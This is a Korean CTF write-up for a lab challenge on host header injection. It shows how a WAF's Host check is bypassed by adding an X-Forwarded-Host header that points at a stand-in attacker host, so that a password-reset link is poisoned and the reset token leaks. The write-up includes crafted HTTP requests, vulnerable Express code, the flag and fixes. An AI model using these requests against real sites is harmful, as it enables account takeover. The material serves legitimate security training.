+++
title = "VulnABLE CTF [LUXORA] Write-up: Host Header Injection 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Host Header", "Silver", "X-Forwarded-Host", "WAF Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Host Header Injection 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Infrastructure Layer (Host Header Injection)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/host/silver`
- **목표**: 프론트엔드 프록시(또는 WAF)가 비정상적인 `Host` 헤더를 검사하고 차단하는 환경에서, 이를 우회(Bypass)할 수 있는 대체 헤더(Alternative Headers)를 사용하여 패스워드 리셋 링크를 오염시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 분석 (Reconnaissance)

`/host/silver` 의 비밀번호 찾기 기능에서 Bronze 단계와 똑같이 `Host` 헤더를 변조해 봅니다.

**[테스트 요청]**
```http
POST /host/silver/reset HTTP/1.1
Host: evil-attacker.com
...
```

**[서버의 응답]**
```html
<div class="error">
  [Security Block] Invalid Host Header. Only 'localhost:3000' is allowed.
</div>
```

**[해커의 사고 과정]**
1. 프론트엔드의 방화벽(WAF)이나 리버스 프록시가 `Host` 헤더의 값을 검사하여 블랙리스트/화이트리스트 차단을 수행하고 있다.
2. `Host` 헤더 자체를 건드리면 입구 컷을 당한다. 따라서 `Host` 헤더는 정상적인 값(`localhost:3000`)으로 유지해야 한다.
3. 하지만 백엔드 서버(Node.js 등)는 로드밸런서를 거쳐 들어온 요청을 처리할 때, `Host` 헤더 대신 **`X-Forwarded-Host`** 와 같은 프록시 헤더를 우선적으로 신뢰하도록 설정된 경우가 많다!

---

## 💥 2. 취약점 식별 및 대체 헤더 탐색 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Host: attacker.com)--> [ Web Server ]
                                       |-- Generates Password Reset Link
<-- Link: http://attacker.com/reset ---|
```


이 취약점은 프론트엔드(보안 장비)와 백엔드(애플리케이션) 간의 **신뢰 경계 불일치(Trust Boundary Violation)**를 이용합니다.

### 💡 대체 헤더(Alternative Headers) 주입 테스트
Burp Suite를 통해 `Host` 헤더는 정상으로 두되, `X-Forwarded-Host` 헤더를 덧붙여서 보냅니다.

**[조작된 HTTP 패킷]**
```http
POST /host/silver/reset HTTP/1.1
Host: localhost:3000
X-Forwarded-Host: evil-attacker.com
Content-Type: application/x-www-form-urlencoded

email=admin@luxora.test
```

*(참고: `X-Forwarded-Host` 외에도 `X-Host`, `X-Forwarded-Server`, `Forwarded` 등의 헤더가 자주 쓰입니다.)*

---

## 🚀 3. 공격 수행 및 결과 확인

요청을 전송하고 서버의 반응을 살핍니다.

### 🔍 서버 내부의 동작
1. **[프론트엔드 WAF]**: "Host 헤더가 `localhost:3000`이네? 정상 요청이니 통과시켜야지."
2. **[백엔드 프레임워크]**: "링크를 생성해야 하는데... 아, `X-Forwarded-Host` 헤더가 있네? 프록시를 타고 온 요청인가 보군. 이 값을 써야겠다!"

```javascript
// 취약한 백엔드 로직 (Express.js에서 trust proxy가 켜진 경우 등)
// X-Forwarded-Host를 Host보다 우선하여 읽음
const host = req.headers['x-forwarded-host'] || req.headers.host;
const resetLink = `http://${host}/reset?token=...`;
```

### 🔍 공격 결과
백엔드는 WAF를 무사히 통과한 `X-Forwarded-Host` 값을 사용하여 악성 링크를 생성하고 관리자에게 발송합니다.
관리자(Bot)가 링크를 클릭하면 해커 서버에 토큰이 유출됩니다.

```text
[!] System: Password Reset Poisoning via X-Forwarded-Host detected.
FLAG: FLAG{HOST_🥈_X_FORWARDED_HOST_BYPASS_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

방화벽(WAF)이 HTTP의 가장 기본적인 `Host` 헤더만 방어하고 다른 프록시 식별 헤더들을 무시했을 때, 해커가 이 "뒷문"을 통해 백엔드의 호스트 파악 로직을 속이는 과정을 성공적으로 수행했습니다.

**🔥 획득한 플래그:**
`FLAG{HOST_🥈_X_FORWARDED_HOST_BYPASS_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
백엔드 프레임워크가 무분별하게 프록시 헤더(`X-Forwarded-*`)를 신뢰(Trust Proxy)하도록 설정되었고, 프론트엔드는 클라이언트가 주입한 가짜 프록시 헤더를 걸러내지 않은 것이 원인입니다.

* **안전한 패치 가이드 (프록시 헤더 정규화 및 정적 URL)**
1. **가장 완벽한 방어**: Bronze 단계와 동일하게, 비밀번호 리셋 링크는 절대로 동적 헤더를 쓰지 말고, 환경변수(`.env`)에 정의된 **정적 도메인 주소**만 사용하십시오.
2. **프론트엔드 헤더 초기화(Sanitization)**: 리버스 프록시(Nginx 등) 단에서, 클라이언트가 악의적으로 주입한 `X-Forwarded-*` 헤더를 백엔드로 넘기기 전에 전부 강제로 지워버려야(Drop/Clear) 합니다.
   ```nginx
   # Nginx: 클라이언트가 보낸 가짜 헤더 무시
   proxy_set_header X-Forwarded-Host $host;
   ```
3. **엄격한 Trust Proxy 설정**: Node.js(Express) 등의 백엔드에서 `app.set('trust proxy', true)` 를 무조건 켜두지 말고, 오직 내부 로드밸런서의 IP(예: `10.0.0.5`)에서 온 요청만 프록시 헤더를 신뢰하도록 설정해야 합니다.